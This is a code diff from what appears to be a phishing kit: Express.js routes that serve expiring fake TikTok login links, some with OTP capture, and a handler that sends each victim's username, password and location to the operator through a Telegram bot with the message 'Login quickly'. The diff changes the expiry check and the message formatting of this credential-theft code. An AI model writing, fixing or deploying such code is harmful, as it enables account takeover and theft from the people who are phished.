@@ -12,7 +12,7 @@ router.get("/tikto/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        if (Date.now() > link.expiry) {
+        if (new Date() > new Date(link.expiry)) {
             return res.redirect("/notfound");
         }
         if (linkId.length !== 24 || !link || link.linkType !== 'TIKTOK') {
@@ -31,7 +31,7 @@ router.get("/tikto/otp/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        if (Date.now() > link.expiry) {
+        if (new Date() > new Date(link.expiry)) {
             return res.redirect("/notfound");
         }
         if (linkId.length !== 24 || !link || link.linkType !== 'TIKTOK') {
@@ -69,10 +69,11 @@ router.post("/tikto/:linkId", async (req, res) => {
             await bot.sendMessage(user.telegramID, `
                 😈 New Entry 😈
 SOCIAL MEDIA: TIKTOK
+
 LOCATION: ${country}
+
 USERNAME: ${username}
 PASSWORD: ${password}
-
 OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}
 
 Login quickly 🏃🏾🏃🏾🏃🏾
